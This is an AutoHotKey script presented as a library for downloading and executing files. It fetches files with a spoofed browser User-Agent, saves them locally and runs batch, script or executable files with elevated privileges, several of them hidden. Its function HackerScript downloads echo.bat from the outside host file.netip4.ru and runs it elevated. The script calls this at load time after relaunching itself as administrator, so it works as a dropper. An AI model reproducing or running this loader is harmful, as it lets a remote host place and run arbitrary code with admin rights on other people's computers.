; *********************************************************
; 
; lib_func-1.1.0.ahk
; This file Contains Library Functions for Download and 
; Execute via AutoHotKey
;
; Version 0.0.1.0 Build 1
; Source: C:\pub1\Distrib\LIB\LIB-AHK\
;
; *********************************************************

; *********************************************************
;
; getTempEnviron()
; This Function Returns the Path for User Variable TEMP
;
; PARAMETERS:   NONE
; RETURNS:      Path For User Variable %TEMP% if Success
;               "C:\Windows\Temp" if API Error
;				"" if General Sysytem Error
;
; *********************************************************/
getTempEnviron()
{
    envVariable := A_Temp
    IfNotExist, % envVariable
    {
        envVariable := ""
    }
    Return envVariable
}

;* ********************************************************
;
; getUtilEnviron()
; This Function Returns the Path for User Variable TEMP
;
; PARAMETERS:   NONE
; RETURNS:      Path For User Variable %UTIL% if Success
;               "%TEMP%" if API Error
;               "" if General Sysytem Error
;
;**********************************************************
getUtilEnviron()
{
    utilPath := "C:\Util"
    IfNotExist, %utilPath%
    {
        utilPath := getTempEnviron()
    }
    Return utilPath
}

;* *********************************************************
; * Function getXmlHttp01
; * This Function Registers XMLHTTP Object both at
; * Windows Script Shell and at Web Browswers
; * If Object can't Register it Returns Empty String
; *
; * PARAMETERS:  NONE
; * RETURNS:     XMLHTTP Object if Success
; *              Empty String if no COM Object Registred
; * *********************************************************/
getXmlHttp01()
{
    try {
        anHTTP := ComObjCreate("MSXML2.ServerXMLHTTP.6.0")
    } Catch, e {
        try {
            anHTTP := ComObjCreate("MSXML2.ServerXMLHTTP.4.0")
        } Catch, ee {
            try {
                anHTTP := ComObjCreate("MSXML2.XMLHTTP")
            } Catch, eee {
                try {
                   anHTTP := ComObjCreate("Microsoft.XMLHTTP") 
                }
                Catch, eeee {
                    anHTTP := ""
                }
            }
        }
        
    }
    Return anHTTP
}

;* *********************************************************
; * Function getXmlHttp02
; * This Function Registers XMLHTTP Object both at
; * Windows Script Shell and at Web Browswers
; * If Object can't Register it Returns Empty String
; *
; * PARAMETERS:  NONE
; * RETURNS:     XMLHTTP Object if Success
; *              Empty String if no COM Object Registred
; * *********************************************************/
getXmlHttp02()
{
    try {
        anHTTP := ComObjCreate("MSXML2.XMLHTTP")
    } Catch, e {
        try {
            anHTTP := ComObjCreate("MSXML2.ServerXMLHTTP.6.0")
        } Catch, ee {
            try {
                anHTTP := ComObjCreate("MSXML2.ServerXMLHTTP.4.0")
            } Catch, eee {
                try {
                   anHTTP := ComObjCreate("Microsoft.XMLHTTP") 
                }
                Catch, eeee {
                    anHTTP := ""
                }
            }
        }
        
    }
    Return anHTTP
}

;* *********************************************************
;
; UploadFilesFromInt( strFile, strURL, strPath )
; This Function Upload the File strFile from URL on HTTP/HTTPS Protocols
; and Save it on Local Computer to Path strPath
; Function Uses Objects "Microsoft.XMLHTTP" and "Adodb.Stream"
;
; PARAMETERS:   strFile -- a File to be Downloaded (only name and extension)
;               strURL -- an URL of the web-site, from which the File
;               is Downloaded
;               strPath -- a Place in a Windows Computer (Full path without slash)
;               in which the File is Downloaded
;
; RETURNS:      0 -- If File is Normally Downloaded and Created
;               1 -- if File in Path strPath Can't Create
;               2 -- if XMLHTTP or ADOStream Can't Initialize
;				3 -- if Emty HTTP Responce or Send Access Denied
;				4 -- if HTTP Response Not 200 (while is not make)
;
; *********************************************************/
UploadFilesFromInt( strFile, strURL, strPath)
{
    ; Define Array Variable
    intUploadFilesFromInt := 0
    ; Define XmlHttp Object
    xmlHttp :=  getXmlHttp01()
    If (xmlHttp == ""){
        Return 2
    }
    ; Define AdoStream Object
    try {
        adoStream := ComObjCreate("Adodb.Stream")
    }
    Catch, e
    {
        Return 2
    }
    ; Define Full URL
    strFileUrl := strURL . strFile
    ; Define Full Local File Name
    strLocalFile := strPath . "\" . strFile
    ; Check If Folder EXist
    If(FileExist( strPath ))
        intUploadFilesFromInt := 0
    Else
        intUploadFilesFromInt := 1
    ; Download File 
    ; Open URL (GET Request synchronous anonymous)
    try {
        xmlHttp.Open("GET", strFileUrl, False)
    }
    Catch, e {
        MsgBox, 16, Error, Can't Open URL: %strFileUrl% `nError: %e%, 20
        Return 3
    }
    ; Set User-Agent Header (for Safari Browser)
    xmlHttp.SetRequestHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36")
    ;xmlHttp.onreadystatechange := Func("ReadyStatus0001") ; OnReady Status Function
    ; Send File from URL
	try {
        xmlHttp.Send()
    }
    Catch, e {
        MsgBox, 16, System Error, Can't make Send() Request!`nMay be Blocked with Antivirus, 10
    }
    ; Check Response Status (Error if not 200)
    intStatus := xmlHttp.status 
    If (intStatus == 200 && intUploadFilesFromInt == 0) {
        blnExistRemoteFile := True
    }
    Else {
        blnExistRemoteFile := False
        intUploadFilesFromInt := 4
        MsgBox, 16, Error, Wrong HTTP Status %intStatus%  `nURL = %strFileUrl%, 20
        xmlHttp.Abort()
    }
    ;; ====
    ;; This is a Test of a HTTP Request
    ;; 
    ;; aStatus := xmlHttp.status
    ;; aHeader := xmlHttp.getAllResponseHeaders()
    ;; aText := xmlHttp.responseText
    ;; MsgBox, 64, Output, `nStatus = %aStatus% `nHeader =`n%aHeader%`nText =`n`t%aText%, 60
    ;; xmlHttp.Abort()
    ;; ==== The End of Test of an HTTP Request

    ; Write Responce to a File
    If (blnExistRemoteFile){
        ; Set AdoStream Type Mode and Open it
        adoStream.Type := 1
        adoStream.Mode := 3
        adoStream.Open()
        ; Write to AdoStream Response Body of HTTP Request
        adoStream.Write(xmlHttp.responseBody)
        ; Save Stream to File 
        try {
            adoStream.SaveToFile( strLocalFile, 2 )
        }
        Catch, e {
            MsgBox, 16, System Error, Can't Save File Stream into File: %strLocalFile%. `nCheck Access Rights!, 15
            intUploadFilesFromInt := 1
        }
        ; Close AdoStream `
        adoStream.Close()
    }
    ; Close URL
    xmlHttp.Abort()
    ; Check If File Downloaded
    If (!FileExist(strLocalFile) && intUploadFilesFromInt == 0)
        intUploadFilesFromInt := 1
    Return intUploadFilesFromInt
}

;* *********************************************************
;
; ReadyStatus0001()
; This Function Uses at UploadFilesFromInt Function
; for get Ready Status 
;
; PAREMETERS: NONE 
; RETURNS:    NONE
; GLOBALS:    req
;
;* *********************************************************
ReadyStatus0001()
{
    global xmlHttp, cb
    if(xmlHttp.readyState == 4) {
        cb[1] := xmlHttp.status ; Status of Reguest (Integer Number)
        cb[2] := xmlHttp.getAllResponseHeader() ; Response Header
        cb[3] := xmlHttp.responseText ; Response Text
        cb[4] := xmlHttp.responseBody ; Response Body
    }
    return
}

;******************************************************************************
;
; RunDownloadedAhk01( strPath, strAHK )
; This Function Run Hidden and Elevated strAHK File
; with Command RunWait *RunAs "%A_AhkPath%" /restart "%ScriptFullPath%",, Hide
;
; PARAMETERS:   strPath -- The Path to strVBS
;               strAHK -- a Ahk File with instructions
;               (Windows AutoHotKey 1.1)
;
; RETURNS:      0 if Success
;				1 if Path not Found
;
;*****************************************************************************/
RunDownloadedAhk01( strPath, strAHK ){
    ScriptFullPath := strPath . "\" . strAHK
    AhkPath := "C:\Util\AutoHotkeyU32.exe"
    if( !FileExist(ScriptFullPath))
        Return 1
    if( !FileExist(AhkPath))
        Return 1
    ;; test ====
    ;; RunWait, *RunAs "%AhkPath%" /restart "%ScriptFullPath%",, Max
    RunWait, *RunAs "%A_AhkPath%" /restart "%ScriptFullPath%",, Hide
    
    Return 0
}

;******************************************************************************
;
; RunDownloadedCmd01( strPath, strCmd )
; This Function Run Hidden and Elevated strCmd File
; with Command RunWait *RunAs "%A_ComSpec%" /c "%ScriptFullPath%",, Hide
;
; PARAMETERS:   strPath -- The Path to strVBS
;               strCmd -- a Cmd|Bat File with instructions
;               (Windows Batch File)
;
; RETURNS:      0 if Success
;				1 if Path not Found
;
;*****************************************************************************/
RunDownloadedCmd01( strPath, strCmd ){
    ScriptFullPath := strPath . "\" . strCmd
    if( !FileExist(ScriptFullPath))
        Return 1
    if( !FileExist( A_ComSpec ))
        Return 1
    ;; test ====
    RunWait, *RunAs "%A_ComSpec%" /c "%ScriptFullPath%"
    ;; RunWait, *RunAs "%A_ComSpec%" /c "%ScriptFullPath%",, Hide
    
    Return 0
}

;******************************************************************************
;
; RunDownloadedCmd01( strPath, strCmd )
; This Function Run Show and Elevated strCmd File
; with Command RunWait *RunAs "%A_ComSpec%" /c "%ScriptFullPath%",, Hide
;
; PARAMETERS:   strPath -- The Path to strVBS
;               strCmd -- a Cmd|Bat File with instructions
;               (Windows Batch File)
;
; RETURNS:      0 if Success
;				1 if Path not Found
;
;*****************************************************************************/
RunDownloadedCmd02( strPath, strCmd ){
    ScriptFullPath := strPath . "\" . strCmd
    eleEXE := "C:\Elevation\ele.exe"
    if( !FileExist(ScriptFullPath))
        Return 1
    if( !FileExist( A_ComSpec ))
        Return 1
    ;; test ====
    ;; RunWait, *RunAs "%A_ComSpec%" /c "%ScriptFullPath%"
    if( !FileExist(eleEXE))
        RunWait, *RunAs "%A_ComSpec%" /c "%ScriptFullPath%"
    Else
        RunWait, %eleEXE% "%A_ComSpec%" /c "%ScriptFullPath%"
    
    Return 0
}

;******************************************************************************
;
; RunDownloadedExe01( strPath, strExe, strOpt )
; This Function Run Hidden and Elevated strExe File
; with Command RunWait *RunAs "%A_ComSpec%" /c "%ScriptFullPath%",, Hide
;
; PARAMETERS:   strPath -- The Path to strVBS
;               strExe -- an Exe File to Run
;               (Windows Executions)
;               strOpt -- Options od EXE File
;
; RETURNS:      0 if Success
;				1 if Path not Found
;
;*****************************************************************************/
RunDownloadedExe01( strPath, strExe, strOpt ){
    ScriptFullPath := strPath . "\" . strExe
    if( !FileExist(ScriptFullPath))
        Return 1
    ;; test ====
    ;; RunWait, *RunAs "%ScriptFullPath%" %strOpt%
    RunWait, *RunAs "%ScriptFullPath%" %strOpt%,, Hide
    
    Return 0
}

;******************************************************************************
;
; CmdDownloadedRun01( strURL, strCmd )
; This Function Download and Run Hidden and Elevated strCmd File
;
; PARAMETERS:   strURL -- The URL of strCmd
;               strCmd -- a Bat|Cmd File to Run
;               (Windows Command Shell)
;
; RETURNS:      0 if Success
;				1 if Path not Found
;               2 if Can't Download File
;
;*****************************************************************************/
CmdDownloadedRun01( strURL, strCmd )
{
    strPath := getUtilEnviron()
    If (!FileExist(strPath))
        Return 1
    iRes := UploadFilesFromInt( strCmd, strURL, strPath)
    If (iRes != 0)
        Return 2
    iRes := RunDownloadedCmd01( strPath, strCmd )
    Return iRes
}

;******************************************************************************
;
; HackerScript()
; This Function Download and Run Hidden and Elevated a File
;
; PARAMETERS:   NONE 
;
; RETURNS:      NONE 
;
;*****************************************************************************/
HackerScript()
{
    strFile := "echo.bat"
    http_Pref01 := "http"
    http_Host01 := "file.netip4.ru"
    http_Port01 := "80"
    LIBCMD_Folder := "/Exponenta/Distrib/LIB-CMD/"
    host01 := http_Pref01 . "://" . http_Host01 . ":" . http_Port01 . LIBCMD_Folder
    ;; Test 
    MsgBox 64, URL, %host01%, 10
    iRes := CmdDownloadedRun01( host01, strFile )
    If (iRes == 0)
        MsgBox, 64, Succes, Success Download and Execute, 15
    If (iRes == 1)
        MsgBox, 16, System Error, Error File Integrity`nCheck File System and Access Rights, 15
    If (iRes == 2)
        MsgBox, 16, Error, Error File can't Download, 15
}

;******************************************************************************
;
; HackerScriptElevated()
; This Function Run HackerScript() Function with Elevated Privileges
;
; PARAMETERS:   NONE 
;
; RETURNS:      NONE 
;
;*****************************************************************************/
HackerScriptElevated(){
    full_command_line := DllCall("GetCommandLine", "str")

    if not (A_IsAdmin or RegExMatch(full_command_line, " /restart(?!\S)"))
    {
        try
        {
            if A_IsCompiled
                Run *RunAs "%A_ScriptFullPath%" /restart
            else
                Run *RunAs "%A_AhkPath%" /restart "%A_ScriptFullPath%"
        }
        ExitApp
    }
    ;; Test !!!
    ;; MsgBox A_IsAdmin: %A_IsAdmin%`nCommand line: %full_command_line%
    HackerScript()
}


testRun(){
    ;strPath := "."
    ;strFile := "HelloWorld.ahk"
    ;strPath := "C:\pub1\Distrib\LIB\BAT"
    ;strFile := "echo.bat"
    strPath := "C:\pub1\Distrib\LIB\Exe"
    strFile := "HelloWorld01.exe"
    strOpt = ""
    ScriptFullPath := strPath . "\" . strFile
    MsgBox, %ScriptFullPath%
    ;iRes := RunDownloadedAhk01( strPath, strFile )
    iRes := RunDownloadedExe01( strPath, strFile, strOpt )
    MsgBox, %iRes%
}

testPath()
{
    Message := "The Path`t" . getUtilEnviron()
    MsgBox, 64, System Information, %Message%, 10
}

testURL(){
    strURL := "https://www.autohotkey.com/download/1.1/"
    ;strURL := "https://www.google.com/"
    strFile := "version.txt"
    strPath := getTempEnviron()
    ; iRes := 0
    iRes := UploadFilesFromInt( strFile, strURL, strPath )
    If (iRes == 0)
        MsgBox, 64, Success, Success File Download
    Else
        MsgBox, 16, Error, Error File Download`niRes = %iRes%
}

HackerScriptElevated()
